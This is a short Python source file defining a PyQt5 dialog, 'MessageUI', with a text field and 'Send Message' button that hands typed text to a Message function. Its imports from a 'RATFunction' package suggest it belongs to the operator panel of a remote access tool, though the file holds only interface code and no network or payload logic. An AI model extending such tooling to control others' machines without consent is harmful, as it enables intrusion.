import sys
from PyQt5.QtWidgets import QApplication, QWidget, QLineEdit, QPushButton, QVBoxLayout

from RATFunction.Message import Message
from RATFunction.RATFunctionUI import RATFunctionUI


class MessageUI(RATFunctionUI):
    def __init__(self, function: Message):
        super().__init__(function)
        self.message_function = function

        # Create a QLineEdit widget for text input
        self.text_input = QLineEdit(self)
        self.text_input.returnPressed.connect(self.send_message)

        # Create a QPushButton widget for button press
        self.button = QPushButton('Send Message', self)
        self.button.clicked.connect(self.send_message)

        self.setWindowTitle('Send Message')

        # Create a vertical layout and add the widgets to it
        layout = QVBoxLayout(self)
        layout.addWidget(self.text_input)
        layout.addWidget(self.button)

        self.setMinimumSize(400, 100)

    def send_message(self):
        text = self.text_input.text()
        self.message_function.send_message(text)
        self.text_input.clear()

